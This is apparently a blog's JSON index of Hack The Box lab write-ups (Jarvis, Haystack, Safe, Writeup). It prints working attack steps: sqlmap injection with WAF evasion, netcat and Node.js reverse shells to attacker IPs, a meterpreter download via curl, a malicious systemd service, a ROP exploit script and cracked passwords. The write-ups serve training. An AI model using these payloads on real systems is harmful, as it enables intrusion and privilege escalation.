03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)80/tcp    open  http    Apache httpd 2.4.25 ((Debian))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Stark Hotel64999/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumeration on port 64999The page on port 64999 displays a banned error message. This page is used whenever the protection mecanism is triggered on the box. Traffic to port 80 is redirected to port 64999 using iptables whenever an SQL injection is detected.Web enumeration on port 80On port 80 we have the webpage of Stark Hotel.There’s a link that display the various rooms.I spidered the website with Burp and found a couple of PHP files.To book a room, the room.php file takes the cod parameter. The room ID is probably stored in a database so this is target for a potential SQL injection.SQL injectionI used sqlmap to scan for SQL injection points:sqlmap -u http://jarvis.htb/room.php?cod=1 -p codI started getting 404 errors and got the Hey you have been banned for 90 seconds, don't be bad message when I tried browsing the site. There’s some kind of WAF on the site that triggers when it’s being scanned for SQL injections.There’s an HTTP header in the response that confirms this:To bypass the WAF, I changed the User-Agent header to a random header and added a delay when scanning with SQLmap:sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agentsqlmap found 3 type of SQL injections  boolean-based blind  time-based blind  UNION queryBy default, sqlmap will use the union query since it’s much faster than the other two.We easily get a shell using the --os-pwn option in sqlmap:sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-pwnEscalating to user pepper/var/www/Admin-Utilities contains a simpler.py script that can be executed as user pepper through sudo:www-data@jarvis:~/Admin-Utilities$ sudo -lMatching Defaults entries for www-data on jarvis:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on jarvis:    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.pyThe ping function contains a command injection vulnerability. Because it uses the os.system function to execute the ping, we can pass additional parameters to execute commands.def exec_ping():    forbidden = ['&amp;', ';', '-', '`', '||', '|']    command = input('Enter an IP: ')    for i in forbidden:        if i in command:            print('Got you')            exit()    os.system('ping ' + command)There’s a list of forbidden commands so we can’t simply use the semi-colon or ampersand characters to inject commands but the $() characters are not filtered.I’ve created a small script that’s execute a netcat reverse shell into /dev/shm/shell.sh:#!/bin/shnc -e /bin/bash 10.10.14.5 5555I can execute the script by injecting the following payload in simpler.py:www-data@jarvis:~$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -psudo -u pepper /var/www/Admin-Utilities/simpler.py -p***********************************************     _                 _                        ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ / __| | '_ ` _ \\| '_ \\| |/ _ \\ '__| '_ \\| | | |\\__ \\ | | | | | | |_) | |  __/ |_ | |_) | |_| ||___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, |                |_|               |_|    |___/                                 @ironhackers.es                                ***********************************************Enter an IP: $(/dev/shm/shell.sh)$(/dev/shm/shell.sh)I now have a shell as pepper:# nc -lvnp 5555Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::5555Ncat: Listening on 0.0.0.0:5555Ncat: Connection from 10.10.10.143.Ncat: Connection from 10.10.10.143:38924.iduid=1000(pepper) gid=1000(pepper) groups=1000(pepper)python -c 'import pty;pty.spawn(\"/bin/bash\")'pepper@jarvis:/var/www$ cdcdpepper@jarvis:~$ lslsWeb  user.txtpepper@jarvis:~$ cat user.txt2afa36c...PrivescLooking at SUID binaries, the systemctl program stands out since it’s not normally SUID:pepper@jarvis:~$ find / -perm /4000 2&gt;/dev/null[...]/bin/systemctl[...]The group has been changed to pepper so this is likely our next target:pepper@jarvis:~$ ls -l /bin/systemctl-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctlBecause we can run systemctl as root, we can register new services that get executed as whatever user we want. Getting root access is simple since all we need to do is register a new service that’s spawn another reverse shell. I’ll just create /dev/shm/pwn.service:[Unit]Description=Pwn service[Service]ExecStart=/bin/nc -e /bin/bash 10.10.14.5 7777[Install]WantedBy=multi-user.targetThen register the new service and start it:pepper@jarvis:/dev/shm$ systemctl enable /dev/shm/pwn.serviceCreated symlink /etc/systemd/system/multi-user.target.wants/pwn.service -&gt; /dev/shm/pwn.service.Created symlink /etc/systemd/system/pwn.service -&gt; /dev/shm/pwn.service.pepper@jarvis:/dev/shm$ systemctl start pwnWe then get a reverse shell as root:# nc -lvnp 7777Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777Ncat: Connection from 10.10.10.143.Ncat: Connection from 10.10.10.143:48144.iduid=0(root) gid=0(root) groups=0(root)cat /root/root.txtd41d8cd..."
  },
  
  {
    "title": "Haystack - Hack The Box",
    "url": "/posts/htb-writeup-haystack/",
    "categories": "hackthebox, infosec",
    "tags": "linux, elasticsearch, easy, ctf-like, logstash, kibana, CVE-2018-17246",
    "date": "2019-11-02 00:00:00 +0800",
    





    
    "snippet": "Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SS...",
    "content": "Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SSH shell. After exploiting CVE-2018-17246 in Kibana, I get another shell with user kibana who has read access on the configuration for logstash which is running as root. The logstash configuration will run as root any command placed in a specific logstash directory/file so once I figured that out it was easy to get a root shell.Summary  The SSH password for user security can be found in the ElasticSearch database which is publicly accessible  A vulnerability exists in Kibana (CVE-2018-17246) which let us get RCE and land a shell as user kibana  Logstash is configured to root as root and will run commands we specify in a specific log filePortscan# nmap -sC -sV -p- 10.10.10.115Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 13:28 EDTNmap scan report for haystack.htb (10.10.10.115)Host is up (0.018s latency).Not shown: 65532 filtered portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: |   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)80/tcp   open  http    nginx 1.12.2|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (text/html).9200/tcp open  http    nginx 1.12.2| http-methods: |_  Potentially risky methods: DELETE|_http-server-header: nginx/1.12.2|_http-title: Site doesn't have a title (application/json; charset=UTF-8).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 311.13 secondsWebpageThe webpage just has an image of a needle in a haystack.I ran gobuster but didn’t find anything else on the site.The image doesn have something hidden in it. I ran strings and found some base64 at the end.# strings needle.jpg | tail -n 1bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==# strings needle.jpg | tail -n 1 | base64 -dla aguja en el pajar es \"clave\"I don’t know spanish so I translated it with Google Translate: the needle in the haystack is \"key\"ElasticSearchPort 9200 is a well-known port for the ElasticSearch database. When I do a GET on / I see that it’s running verison 6.4.2:I can retrieve the list of indices with the _cat/indices API call:There are two user created indices: quotes and bankTo retrieve the content of the index, I use the /bank/_search API call:By default, it only returns 10 records. To get the full list we can increase the size with /bank/_search?size=1000.I didn’t find anything interesting in the bank index. It just has bank records but no useful information.The quotes index contains a bunch of quotes in spanish but a few records have base64 encoded data in them:\"quote\": \"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=\"\"quote\": \"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg\"The base64 above is:user: security pass: spanish.is.keyI can SSH in with the credentials above and get the user flag:[security@haystack ~]$ iduid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[security@haystack ~]$ lsuser.txt[security@haystack ~]$ cat user.txt04d18b...Getting access to user kibanaThe box has the full ELK stack installed (ElasticSearch, Logstash and Kibana):  Port 9200 is ES  Port 9600 is logstash  Port 5601 is Kibana[security@haystack ~]$ ss -ln[...]tcp   LISTEN   0   128                  *:80tcp   LISTEN   0   128                  *:9200tcp   LISTEN   0   128                  *:22tcp   LISTEN   0   128          127.0.0.1:5601tcp   LISTEN   0   128   ::ffff:127.0.0.1:9000tcp   LISTEN   0   128                 :::80tcp   LISTEN   0   128   ::ffff:127.0.0.1:9300tcp   LISTEN   0   128                 :::22tcp   LISTEN   0   50    ::ffff:127.0.0.1:9600I can see that Kibana is running as user kibana:kibana     6370  1.9  5.3 1345840 206188 ?      Ssl  09:24   0:22 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.ymlLogstash is running as root:root       6371 11.6 12.4 2733400 480372 ?      SNsl 09:24   2:15 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstashElasticSearch is running as elasticsearch:elastic+   6960  7.1 34.4 3319312 1330936 ?     Ssl  09:24   1:21 /bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.io.tmpdir=/tmp/elasticsearch.nDIY3AAQ -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/elasticsearch -XX:ErrorFile=/var/log/elasticsearch/hs_err_pid%p.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -XX:+PrintGCApplicationStoppedTime -Xloggc:/var/log/elasticsearch/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=32 -XX:GCLogFileSize=64m -Des.path.home=/usr/share/elasticsearch -Des.path.conf=/etc/elasticsearch -Des.distribution.flavor=default -Des.distribution.type=rpm -cp /usr/share/elasticsearch/lib/* org.elasticsearch.bootstrap.Elasticsearch -p /var/run/elasticsearch/elasticsearch.pid --quietLogstash and Kibaba are only listening on localhost. To access the ports from my box I set up SSH local port forwarding: # ssh -L 5601:127.0.0.1:5601 -L 9600:127.0.0.1:9600 security@10.10.10.115Kibana is running version Version: 6.4.2:There’s an LFI CVE in Kibana for that version which let us execute Javascript code.https://github.com/mpgn/CVE-2018-17246I created /tmp/shell.js with a standard reverse shell:(function(){    var net = require(\"net\"),        cp = require(\"child_process\"),        sh = cp.spawn(\"/bin/sh\", []);    var client = new net.Socket();    client.connect(4444, \"10.10.14.12\", function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return /a/; // Prevents the Node.js application form crashing})();I then triggered my payload with curl \"http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/shell.js\"A got a callback soon after:# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.115.Ncat: Connection from 10.10.10.115:47552.iduid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0python -c 'import pty;pty.spawn(\"/bin/bash\")'bash-4.2$ PrivescI saw earlier that logstash is running as root and with user kibana I have access to the configuration files in /etc/logstash/conf.d:bash-4.2$ ls -ltotal 12-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf-rw-r-----. 1 root kibana 109 jun 24 08:12 output.confbash-4.2$ cat *filter {\tif [type] == \"execute\" {\t\tgrok {\t\t\tmatch =&gt; { \"message\" =&gt; \"Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\" }\t\t}\t}}input {\tfile {\t\tpath =&gt; \"/opt/kibana/logstash_*\"\t\tstart_position =&gt; \"beginning\"\t\tsincedb_path =&gt; \"/dev/null\"\t\tstat_interval =&gt; \"10 second\"\t\ttype =&gt; \"execute\"\t\tmode =&gt; \"read\"\t}}output {\tif [type] == \"execute\" {\t\tstdout { codec =&gt; json }\t\texec {\t\t\tcommand =&gt; \"%{comando} &amp;\"\t\t}\t}}Logstash has filters configured to execute commands put in /opt/kibana/logstash_* where the message contains Ejecutar comando :  followed by a command.I created a meterpreter binary payload:ragingunicorn:~/htb/haystack# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.12 LPORT=5555[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 129 bytesFinal size of elf file: 249 bytesSaved as: metroot@ragingunicorn:~/htb/haystack# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...Then transfered it to the box:bash-4.2$ curl -o /tmp/met http://10.10.14.12/met &amp;&amp; chmod 777 /tmp/met  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   249  100   249    0     0   6119      0 --:--:-- --:--:-- --:--:--  6225Then I created the trigger file:bash-4.2$ echo \"/tmp/met\" &gt; /opt/kibana/logstash_1 I waited a few minutes then got a callback as root:meterpreter &gt; shellProcess 12972 created.Channel 1 created.cat /root/root.txt3f5f72..."
  },
  
  {
    "title": "Safe - Hack The Box",
    "url": "/posts/htb-writeup-safe/",
    "categories": "hackthebox, infosec",
    "tags": "linux, binary exploit, buffer overflow, keepass",
    "date": "2019-10-26 00:00:00 +0800",
    





    
    "snippet": "Safe was a bit of a surprise because I didn’t expect a 20 points box to start with a buffer overflow requiring ropchains. The exploit is pretty straightforward since I have the memory address of th...",
    "content": "Safe was a bit of a surprise because I didn’t expect a 20 points box to start with a buffer overflow requiring ropchains. The exploit is pretty straightforward since I have the memory address of the system function and I can call it to execute a shell. The privesc was a breeze: there’s a keepass file with a bunch of images in a directory. I simply loop through all the images until I find the right keyfile that I can use with John the Ripper to crack the password and recover the root password from the keepass file.Summary  I find a custom service running on port 1337 that has a buffer overflow  I create an exploit using ROP for the vulnerable service and gain RCE  Once I have a shell I find a KeePass vault with a bunch of image files  I can crack the password for the KeePass vault (one of the image file is the keyfile) which contains the root passwordReconI’m going to use masscan this time to speed up the portscan:root@kali:~# masscan -p1-65535 10.10.10.147 --rate 1000 ---open --banners -e tun0Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-29 01:13:24 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65535 ports/host]Discovered open port 1337/tcp on 10.10.10.147Discovered open port 80/tcp on 10.10.10.147Discovered open port 22/tcp on 10.10.10.147Additional scripts and banner checks with nmap now that I have the list of ports open:root@kali:~# nmap -p22,80,1337 -sC -sV 10.10.10.147Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 21:17 EDTNmap scan report for 10.10.10.147Host is up (0.021s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)80/tcp   open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Apache2 Debian Default Page: It works1337/tcp open  waste?| fingerprint-strings: |   DNSStatusRequestTCP: |     21:14:29 up 5:00, 1 user, load average: 0.01, 0.01, 0.00[...]Observations:  Standard SSH and Apache combo running. I’ll make sure to enumerate that HTTP page next.  There’s a weird service running on port 1337. This is not a standard port so I’m probably looking at a custom service created for the purpose of this box.First pass at checking the Apache serviceLooks like the default Debian Apache2 webpage is up on port 80.I get the same default page if I add  safe.htb to my local hostfile. Next, I’ll run Nikto to check for low hanging fruits like robots.txt and dirbust using gobuster and big.txt:root@kali:~# nikto -host 10.10.10.147- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          10.10.10.147+ Target Hostname:    10.10.10.147+ Target Port:        80+ Start Time:         2019-07-28 21:22:32 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.25 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Server may leak inodes via ETags, header found with file /, inode: 2a23, size: 588c4cc4e54b5, mtime: gzip+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS + OSVDB-3092: /manual/: Web server manual found.[...]root@kali:~# gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.147===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://10.10.10.147[+] Threads:        10[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Timeout:        10s===============================================================2019/07/28 21:22:53 Starting gobuster===============================================================/.htaccess (Status: 403)/.htpasswd (Status: 403)/manual (Status: 301)/server-status (Status: 403)I didn’t find anything interesting. I’ll go check out that other port 1337 but I keep in mind that I should fuzz for additional vhosts later if I don’t find anything else.Custom service on port 1337The service on port 1337 shows the output of uptime then echoes back whatever is typed by the user. The connection drops after the input is echoed back.I normally go for simple command injection payloads first and since this is a 20 points this is a likely candidate for that sort of stuff. Unfortunately, the box doesn’t seem to be calling echo or any other Linux binary to echo the input back. I wasn’t able to escape any payload.Next, I try a long string of characters and see that the connection drops without echoing back the data.So I’m probably looking at a buffer overflow exploit here. I don’t have the binary to analyze and I don’t know how to exploit a service blind. The service doesn’t leak any memory data when it crashes, nor do I see any menu or commands that I can use to access additional features.I’ll go back to the webpage and look for clues in the HTML comments. It’s not realistic at all but I find a link to the binary in the comments:I can download the file at http://10.10.10.147/myappIt’s a 64 bits ELF:With gdb and the gef extension, I check what kind of protections are enabled and notice that NX is enabled but PIE isn’t:I don’t know if ASLR is enabled or not on the box though. Time to disassemble the binary and understand how the program works. I’ll use radare2 for this:The sym.test and sym.main are the ones I’m gonna look at first:The sym.main function is pretty straighforward:  It allocates 112 bytes on the stack  It executes /usr/bin/uptime  It prints What do you want me to echo back?  It reads 1000 bytes from the user using gets. This is where the buffer overflow is: it reads more information than the buffer allocated on the stack can store.  It echoes back the user input using putsThe other function sym.test doesn’t do anything useful at first glance: it just moves a few registers and jumps to the memory address contained in the r13 register. Normally, functions return with ret instruction but this one doesn’t, very odd.Before working on an exploit, I want to confirm the exact offset for the overflow.I’ll generate a payload of 112 A’s (as per the disassembly analysis) + 8 bytes containing B. If I’m right, the B’s will land into RBP after the function returns.When I copy/paste the payload in the program, it crashes and I can see the $rbp register contains “BBBBBBBB”.This confirms that the offset to control RIP is 112 + 8: 120 bytes.Building the exploitI can’t just put a shellcode on the stack because NX is enabled so the stack isn’t executable. This is a 20 points box so the exploit is likely something pretty basic and won’t require advanced ropping skills.I have few things I can use to my advantage:  The input uses the gets function and it doesn’t null-terminates so I can use null bytes in my payload  The system function is present in the code so there’s a PLT/GOT entry for this  PIE isn’t enabled so the address for system doesn’t changeUsing objdump I can find the address for system: 0x401040root@kali:~/htb/machines/safe# objdump -d myapp0000000000401040 &lt;system@plt&gt;:  401040:\tff 25 da 2f 00 00    \tjmpq   *0x2fda(%rip)        # 404020 &lt;system@GLIBC_2.2.5&gt;  401046:\t68 01 00 00 00       \tpushq  $0x1  40104b:\te9 d0 ff ff ff       \tjmpq   401020 &lt;.plt&gt;Checking the man page for system, I see that it takes a single parameter:NAME       system - execute a shell commandSYNOPSIS       #include &lt;stdlib.h&gt;       int system(const char *command);The x86-64 calling convention for gcc compiled binaries is RDI, RSI, RDX, RCX for the first four function arguments. To control the binary called by system, I need to point RDI to the memory address of the /bin/sh string. I’ll switch back to gdb / gef to build the exploit.I’ll put a breakpoint on the return instruction from the main function and check what the RDI register is pointing to:RDI has a null-value so it doesn’t point to a memory location I control and therefore is useless at the moment.Next, I’m gonna use ropper -f myapp to look for gadgets I can use to control registers:I’ll use the gadget at 0x401206 to put the address of system into r13. I don’t care about r14 and r15 so I can put any dummy values here. The trick to get the address of /bin/sh is in the sym.test function. The first instruction pushes rbp (which contains the address of /bin/sh) on the stack so it updates the rsp address. The mov rdi, rsp instruction in the fonction takes care of copying the address of rsp into rdi. At that point I’m all set and when the function jumps to r13 it will execute system with /bin/sh as the parameter.The final exploit looks like this:from pwn import *p = remote(\"safe.htb\", 1337)#p = process(\"./myapp\")context(os=\"linux\", arch=\"amd64\")context.log_level = \"DEBUG\"JUNK = \"A\" * 112JUNK += \"/bin/sh\\x00\" # RBP\"\"\"ROP chain to populate r13 with system()'s address:0x0000000000401206: pop r13; pop r14; pop r15; ret;sym.test() -&gt; Need to JMP to address of system at the end (fcn) sym.test 10   sym.test ();           0x00401152      55             push rbp           0x00401153      4889e5         mov rbp, rsp           0x00401156      4889e7         mov rdi, rsp           0x00401159      41ffe5         jmp r13\"\"\"payload = JUNK + p64(0x0000000000401206)    # ROP chain gadgetpayload += p64(0x401040)     # pop r13payload += \"BBBBBBBB\"        # pop r14payload += \"CCCCCCCC\"        # pop r15payload += p64(0x00401152)   # sym.testp.recvline()p.sendline(payload)p.interactive()Running the exploit, I’m able to land a shell on the box:Because the SSH service is listening, I can dump my SSH public key in /home/user/.ssh/authorized_keys:And then I can SSH in and get a proper shell:PrivescThe user directory has a keepass file: MyPasswords.kdbx and a bunch of image files:I’ll copy those files locally so I can attempt to crack the Keepass file:I can’t crack the Keepass file just by itself:But I’m gonna try all those .jpg files as keyfiles:IMG_0547.JPG is the keyfile and bullshit is the passwordUsing kpcli I can open the Keepass file and view the password for root:I can login and su to root:"
  },
  
  {
    "title": "Writeup - Hack The Box",
    "url": "/posts/htb-writeup-writeup/",
    "categories": "hackthebox, infosec",
    "tags": "linux, sqli, cms",
    "date": "2019-10-12 00:00:00 +0800",
    





    
    "snippet": "Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because t...",
    "content": "Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to /usr/local and I can write a binary payload in there that gets executed by run-parts when I SSH in because it’s called without the full path. Another nice box by jkr.Summary  Unauthenticated SQL injection in CMS Made Simple gives us the password hash which we can crack  The CMS user / password can be used to SSH in to the server (password re-use)  The /usr/local/bin directory is writable by low-priv user and we can hijack run-parts which is run by root when SSHing in (path abuse)Tools/Blogs used  CMS Made Simple &lt; 2.2.10 - SQL Injection (exploits/php/webapps/46635.py)Portscan# nmap -p- 10.10.10.138Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-08 22:30 EDTNmap scan report for writeup.htb (10.10.10.138)Host is up (0.018s latency).Not shown: 65533 filtered portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 105.16 secondsWebsite enumerationThe website contains information about fail2ban or a similar kind of script running to prevent 40x errors. This means that if we try to dirbust the site we’ll probably get banned.So I checked robots.txt and found the following:#              __#      _(\\    |@@|#     (__/\\__ \\--/ __#        \\___|----|  |   __#            \\ }{ /\\ )_ / _\\#            /\\__/\\ \\__O (__#           (--/\\--)    \\__/#           _)(  )(_#          `---''---`# Disallow access to the blog until content is finished.User-agent: *Disallow: /writeup/Checking out http://10.10.10.138/writeup/ I see it’s some kind of barebone webpage.The links just display different writeups for previous HTB boxes. I couldn’t trigger any LFI, RFI or SQL injection from /writeup/index.php?page=There’s a hint at the bottom of the page that it’s NOT made with vim.Checking out the source code, I can see it’s made with CMS Made Simple.SQL injection in CMSChecking out searchsploit, I see a whole bunch of exploits for that CMS.The one I highlighted above is an Unauthenticated SQL Injection that allows an attacker to dump the username and password hash from the database. To exploit it, we just need to pass the URI of the CMS and the wordlist we’ll use to crack the password hash:python exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txtWe just found the password for user jkr: raykayjay9The CMS administration webpage at http://10.10.10.138/writeup/admin is protected by an additional HTTP basic web authentication. This is not part of the standard CMS deployment so it was probably added by the box creator. I’m not able to authenticate using the credentials I found in the database and if I try to bruteforce it I get locked out by fail2ban.However the credentials do work with SSH and I’m able to get a shell and the first flag:# ssh jkr@10.10.10.138jkr@10.10.10.138's password:Linux writeup 4.9.0-8-amd64 x86_64 GNU/LinuxThe programs included with the Devuan GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.jkr@writeup:~$ cat user.txtd4e493...PrivescMy user is part of the following groups: uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)I ran through the standard Linux enumeration, checking permissions on files and directories, and noticed that I have write access to folders inside /usr/local:jkr@writeup:~$ ls -l /usr/localtotal 56drwx-wsr-x 2 root staff 20480 Apr 19 04:11 bindrwxrwsr-x 2 root staff  4096 Apr 19 04:11 etcdrwxrwsr-x 2 root staff  4096 Apr 19 04:11 gamesdrwxrwsr-x 2 root staff  4096 Apr 19 04:11 includedrwxrwsr-x 4 root staff  4096 Apr 24 13:13 liblrwxrwxrwx 1 root staff     9 Apr 19 04:11 man -&gt; share/mandrwx-wsr-x 2 root staff 12288 